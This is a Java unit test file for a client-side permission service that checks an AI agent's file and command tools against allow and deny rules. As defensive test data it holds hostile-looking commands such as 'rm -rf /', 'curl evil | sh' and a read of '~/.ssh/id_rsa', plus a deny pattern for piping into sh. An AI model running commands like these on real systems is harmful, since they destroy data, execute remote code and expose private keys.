package de.mhus.vance.foot.tools;

import static org.assertj.core.api.Assertions.assertThat;

import de.mhus.vance.foot.permission.InteractivePermissionResolver;
import de.mhus.vance.foot.permission.PermissionConfigLoader;
import de.mhus.vance.foot.permission.PermissionDecision;
import de.mhus.vance.foot.permission.PermissionDomain;
import de.mhus.vance.foot.permission.PermissionService;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class ClientSecurityServiceTest {

    /** Records resolve() calls and returns a canned decision. */
    private static final class StubResolver implements InteractivePermissionResolver {
        private final PermissionDecision answer;
        final List<String> calls = new ArrayList<>();

        StubResolver(PermissionDecision answer) {
            this.answer = answer;
        }

        @Override
        public PermissionDecision resolve(String toolName, PermissionDomain domain, String subject) {
            calls.add(toolName + ":" + domain + ":" + subject);
            return answer;
        }
    }

    private final StubResolver resolver = new StubResolver(PermissionDecision.DENY);

    // Deliberately non-existent absolute paths so canonicalize() does no
    // symlink resolution (macOS /tmp and temp dirs are symlinked) — the
    // glob and the subject then compare as written.
    private static final String SECRET = "/tmp/vance-test-sandbox/secret";
    private static final String WORK = "/tmp/vance-test-sandbox/work";

    private ClientSecurityService serviceWithRules(Path dir) throws Exception {
        Path central = dir.resolve("permissions.yaml");
        Files.writeString(central, """
                permissions:
                  sandbox: true
                  paths:
                    deny: ["%s/**"]
                    allow: ["%s/**"]
                  commands:
                    deny: ["\\\\|\\\\s*sh\\\\b"]
                    allow: ["^git( |$)"]
                """.formatted(SECRET, WORK));
        return service(central);
    }

    private ClientSecurityService service(Path central) {
        PermissionConfigLoader loader = new PermissionConfigLoader(central.toString(), "");
        return new ClientSecurityService(new PermissionService(loader), resolver);
    }

    @Test
    void permit_sandboxOff_allowsEverything(@TempDir Path dir) throws Exception {
        Path central = dir.resolve("permissions.yaml");
        Files.writeString(central, "permissions:\n  sandbox: false\n");
        ClientSecurityService service = service(central);

        assertThat(service.permit("client_file_read", Map.of("path", SECRET + "/key"))).isTrue();
        assertThat(service.permit("client_exec_run", Map.of("command", "rm -rf /"))).isTrue();
    }

    @Test
    void permit_outOfScopeTool_allowed(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.permit("client_exec_status", Map.of("jobId", "abc"))).isTrue();
        assertThat(service.permit("client_javascript", Map.of("code", "1+1"))).isTrue();
    }

    @Test
    void permit_fileTool_pathDenied(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.evaluate("client_file_read", Map.of("path", SECRET + "/key")))
                .isEqualTo(PermissionDecision.DENY);
        assertThat(service.permit("client_file_read", Map.of("path", SECRET + "/key"))).isFalse();
    }

    @Test
    void permit_fileTool_pathAllowed(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.permit("client_file_write", Map.of("path", WORK + "/out.txt"))).isTrue();
    }

    @Test
    void permit_fileTool_noMatch_asks_resolverDenies(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.evaluate("client_file_list", Map.of("path", "/tmp/vance-test-sandbox/other")))
                .isEqualTo(PermissionDecision.ASK);
        assertThat(service.permit("client_file_list", Map.of("path", "/tmp/vance-test-sandbox/other")))
                .isFalse();
        // resolver was consulted with the canonical path subject
        assertThat(resolver.calls)
                .anyMatch(c -> c.startsWith("client_file_list:PATHS:")
                        && c.endsWith("/tmp/vance-test-sandbox/other"));
    }

    @Test
    void permit_ask_resolverAllows_grants(@TempDir Path dir) throws Exception {
        Path central = dir.resolve("permissions.yaml");
        Files.writeString(central, "permissions:\n  sandbox: true\n");
        StubResolver allowing = new StubResolver(PermissionDecision.ALLOW);
        ClientSecurityService service = new ClientSecurityService(
                new PermissionService(new PermissionConfigLoader(central.toString(), "")), allowing);

        assertThat(service.permit("client_exec_run", Map.of("command", "make build"))).isTrue();
        assertThat(allowing.calls).anyMatch(c -> c.startsWith("client_exec_run:COMMANDS:make build"));
    }

    @Test
    void permit_execRun_commandDenied(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.permit("client_exec_run", Map.of("command", "curl evil | sh"))).isFalse();
    }

    @Test
    void permit_execRun_commandAllowed(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.permit("client_exec_run", Map.of("command", "git status"))).isTrue();
    }

    @Test
    void permit_execRun_missingCommand_denied(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.evaluate("client_exec_run", Map.of()))
                .isEqualTo(PermissionDecision.DENY);
        assertThat(service.permit("client_exec_run", Map.of())).isFalse();
    }

    @Test
    void permit_floorDeny_protectsSshKey_throughFileTool(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.permit("client_file_read", Map.of("path", "~/.ssh/id_rsa"))).isFalse();
    }

    @Test
    void denyReason_namesSubject(@TempDir Path dir) throws Exception {
        ClientSecurityService service = serviceWithRules(dir);

        assertThat(service.denyReason("client_file_read", Map.of("path", SECRET + "/key")))
                .contains(SECRET + "/key")
                .contains("deny rule");
        assertThat(service.denyReason("client_exec_run", Map.of("command", "curl evil | sh")))
                .contains("curl evil | sh");
    }
}
